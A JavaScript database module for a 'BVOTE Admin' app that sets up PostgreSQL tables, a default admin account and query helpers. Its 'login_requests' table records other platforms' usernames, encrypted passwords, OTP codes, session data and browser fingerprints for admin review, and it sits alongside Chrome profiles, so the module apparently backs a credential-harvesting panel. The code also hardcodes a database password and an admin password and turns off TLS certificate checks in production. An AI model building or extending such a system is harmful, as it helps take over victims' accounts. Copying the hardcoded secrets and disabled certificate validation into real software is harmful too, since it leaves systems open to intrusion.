import pkg from "pg";
const { Pool } = pkg;
import bcrypt from "bcrypt";
import dotenv from "dotenv";

dotenv.config();

// Production PostgreSQL Database Manager
class ProductionDatabaseManager {
  constructor() {
    this.pool = null;
    this.isInitialized = false;
  }

  // Initialize PostgreSQL connection pool
  async initialize() {
    try {
      const dbConfig = {
        connectionString:
          process.env.DATABASE_URL ||
          "postgresql://bvote_user:bvote_secure_2025@localhost:5432/bvote_production",
        ssl:
          process.env.NODE_ENV === "production"
            ? { rejectUnauthorized: false }
            : false,
        max: 20,
        idleTimeoutMillis: 30000,
        connectionTimeoutMillis: 2000,
      };

      this.pool = new Pool(dbConfig);

      // Test connection
      const client = await this.pool.connect();
      console.log("✅ Production PostgreSQL connected successfully");
      client.release();

      // Initialize database schema
      await this.initializeSchema();

      this.isInitialized = true;
      return true;
    } catch (error) {
      console.error("❌ Production database connection failed:", error.message);
      return false;
    }
  }

  // Initialize production database schema
  async initializeSchema() {
    const client = await this.pool.connect();

    try {
      // Users table
      await client.query(`
        CREATE TABLE IF NOT EXISTS users (
          id SERIAL PRIMARY KEY,
          email VARCHAR(255) UNIQUE NOT NULL,
          password_hash VARCHAR(255) NOT NULL,
          role VARCHAR(50) DEFAULT 'user',
          full_name VARCHAR(255),
          avatar_url TEXT,
          is_active BOOLEAN DEFAULT true,
          last_login TIMESTAMP,
          created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
          updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
      `);

      // Login requests table
      await client.query(`
        CREATE TABLE IF NOT EXISTS login_requests (
          id SERIAL PRIMARY KEY,
          user_id INTEGER REFERENCES users(id) ON DELETE CASCADE,
          platform VARCHAR(100) NOT NULL,
          username VARCHAR(255) NOT NULL,
          password_encrypted TEXT,
          status VARCHAR(50) DEFAULT 'pending',
          ip_address INET,
          user_agent TEXT,
          browser_info JSONB,
          otp_code VARCHAR(10),
          device_approved BOOLEAN DEFAULT false,
          session_data JSONB,
          expires_at TIMESTAMP,
          created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
          updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
      `);

      // System logs table
      await client.query(`
        CREATE TABLE IF NOT EXISTS system_logs (
          id SERIAL PRIMARY KEY,
          level VARCHAR(20) NOT NULL,
          message TEXT NOT NULL,
          metadata JSONB,
          user_id INTEGER REFERENCES users(id) ON DELETE SET NULL,
          ip_address INET,
          created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
      `);

      // Chrome profiles table
      await client.query(`
        CREATE TABLE IF NOT EXISTS chrome_profiles (
          id SERIAL PRIMARY KEY,
          profile_name VARCHAR(255) NOT NULL,
          profile_path TEXT NOT NULL,
          user_id INTEGER REFERENCES users(id) ON DELETE CASCADE,
          is_active BOOLEAN DEFAULT true,
          config JSONB,
          created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
          updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
      `);

      // Settings table
      await client.query(`
        CREATE TABLE IF NOT EXISTS settings (
          id SERIAL PRIMARY KEY,
          key VARCHAR(255) UNIQUE NOT NULL,
          value JSONB NOT NULL,
          description TEXT,
          created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
          updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
      `);

      // Create default admin user
      const adminExists = await client.query(
        "SELECT id FROM users WHERE email = $1",
        ["admin@bvote.com"]
      );

      if (adminExists.rows.length === 0) {
        const hashedPassword = await bcrypt.hash("bvote_admin_secure_2025", 12);
        await client.query(
          `
          INSERT INTO users (email, password_hash, role, full_name, is_active)
          VALUES ($1, $2, $3, $4, $5)
        `,
          [
            "admin@bvote.com",
            hashedPassword,
            "admin",
            "System Administrator",
            true,
          ]
        );

        console.log("✅ Default admin user created");
      }

      // Insert default settings
      const defaultSettings = [
        {
          key: "app_name",
          value: '"BVOTE Admin"',
          description: "Application name",
        },
        {
          key: "max_login_attempts",
          value: "5",
          description: "Maximum login attempts per hour",
        },
        {
          key: "session_timeout",
          value: "3600",
          description: "Session timeout in seconds",
        },
        {
          key: "auto_approve_devices",
          value: "false",
          description: "Auto approve new devices",
        },
      ];

      for (const setting of defaultSettings) {
        await client.query(
          `
          INSERT INTO settings (key, value, description)
          VALUES ($1, $2, $3)
          ON CONFLICT (key) DO NOTHING
        `,
          [setting.key, setting.value, setting.description]
        );
      }

      console.log("✅ Production database schema initialized");
    } catch (error) {
      console.error("❌ Schema initialization failed:", error.message);
      throw error;
    } finally {
      client.release();
    }
  }

  // Execute query with error handling
  async query(text, params = []) {
    const client = await this.pool.connect();
    try {
      const result = await client.query(text, params);
      return result;
    } catch (error) {
      console.error("Database query error:", error.message);
      throw error;
    } finally {
      client.release();
    }
  }

  // Get user by email
  async getUserByEmail(email) {
    const result = await this.query("SELECT * FROM users WHERE email = $1", [
      email,
    ]);
    return result.rows[0];
  }

  // Create login request
  async createLoginRequest(data) {
    const {
      user_id,
      platform,
      username,
      password_encrypted,
      ip_address,
      user_agent,
      browser_info,
      expires_at,
    } = data;

    const result = await this.query(
      `
      INSERT INTO login_requests
      (user_id, platform, username, password_encrypted, ip_address, user_agent, browser_info, expires_at)
      VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
      RETURNING *
    `,
      [
        user_id,
        platform,
        username,
        password_encrypted,
        ip_address,
        user_agent,
        JSON.stringify(browser_info),
        expires_at,
      ]
    );

    return result.rows[0];
  }

  // Get login requests with pagination
  async getLoginRequests(limit = 50, offset = 0, filters = {}) {
    let query = `
      SELECT lr.*, u.email, u.full_name
      FROM login_requests lr
      LEFT JOIN users u ON lr.user_id = u.id
    `;

    const conditions = [];
    const params = [];
    let paramIndex = 1;

    if (filters.status) {
      conditions.push(`lr.status = $${paramIndex++}`);
      params.push(filters.status);
    }

    if (filters.platform) {
      conditions.push(`lr.platform = $${paramIndex++}`);
      params.push(filters.platform);
    }

    if (conditions.length > 0) {
      query += " WHERE " + conditions.join(" AND ");
    }

    query += ` ORDER BY lr.created_at DESC LIMIT $${paramIndex++} OFFSET $${paramIndex++}`;
    params.push(limit, offset);

    const result = await this.query(query, params);
    return result.rows;
  }

  // Log system event
  async logEvent(
    level,
    message,
    metadata = {},
    userId = null,
    ipAddress = null
  ) {
    await this.query(
      `
      INSERT INTO system_logs (level, message, metadata, user_id, ip_address)
      VALUES ($1, $2, $3, $4, $5)
    `,
      [level, message, JSON.stringify(metadata), userId, ipAddress]
    );
  }

  // Close connection pool
  async close() {
    if (this.pool) {
      await this.pool.end();
      console.log("✅ Database connection pool closed");
    }
  }
}

// Export singleton instance
const productionDB = new ProductionDatabaseManager();
export default productionDB;
